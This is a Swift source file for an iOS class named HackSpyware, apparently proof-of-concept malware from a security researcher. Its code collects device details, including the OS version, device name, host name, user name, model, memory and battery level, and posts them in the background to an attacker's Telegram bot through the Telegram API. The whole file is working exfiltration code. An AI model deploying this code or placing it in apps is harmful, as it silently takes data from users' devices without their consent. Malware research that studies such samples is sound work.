//
//  HackSpyware.swift
//  Hack
//
//  created by cocomelonc on 10/05/2025.
//

import Foundation
import UIKit

public class HackSpyware {
    public static let shared = HackSpyware(); private init() {}
    public var botToken: String = ""
    public var chatId: String = ""
    private var telegramApiUrl: String {
        return "https://api.telegram.org/bot\(botToken)/sendMessage"
    }

    // collect systeminfo
    private func collectSystemInfo() throws -> String {
        let device = UIDevice.current
        let processInfo = ProcessInfo.processInfo
        
        let systemName = processInfo.operatingSystemVersionString
        let hostName = processInfo.hostName
        let userName = NSUserName()
        let mem = processInfo.physicalMemory / (1024 * 1024 * 1024)
        let model = device.localizedModel
        let batteryLevel = device.batteryLevel
        let deviceName = device.name

        let systemInfo = """
        📱 Meow ♥️
        📱 System Info:
        📱 Version IOS: \(systemName)
        📱 Device name: \(deviceName)
        📱 Host Name: \(hostName)
        📱 User Name: \(userName)
        📱 Model: \(model)
        📱 Memory usage: \(mem) GB
        📱 Battery level: \(Int(batteryLevel * 100))%
        """
        return systemInfo
    }
    
    // send systeminfo
    public func sendSystemInfo(completion: (() -> Void)? = nil) {
        DispatchQueue.global(qos: .utility).async {
            let systemData: String
            do {
                systemData = try self.collectSystemInfo()
            } catch {
                systemData = "error collecting systeminfo: \(error.localizedDescription)"
            }
            
            self.sendMessageToTelegram(message: systemData, completion: completion)
        }
    }

    // sending messages to telegram without Alamofire
    private func sendMessageToTelegram(message: String, completion: (() -> Void)? = nil) {
        guard let url = URL(string: telegramApiUrl) else {
            print("invalid Telegram API URL")
            completion?()
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        
        let jsonBody: [String: Any] = [
            "chat_id": chatId,
            "text": message
        ]
        
        do {
            let bodyData = try JSONSerialization.data(withJSONObject: jsonBody, options: [])
            request.httpBody = bodyData
        } catch {
            print("failed to serialize JSON: \(error.localizedDescription)")
            completion?()
            return
        }
        
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                print("error sending message: \(error.localizedDescription)")
            } else if let data = data,
                      let responseString = String(data: data, encoding: .utf8) {
                print("telegram response: \(responseString)")
            } else {
                print("successfully sent message with no response data.")
            }
            completion?()
        }
        
        task.resume()
    }
}
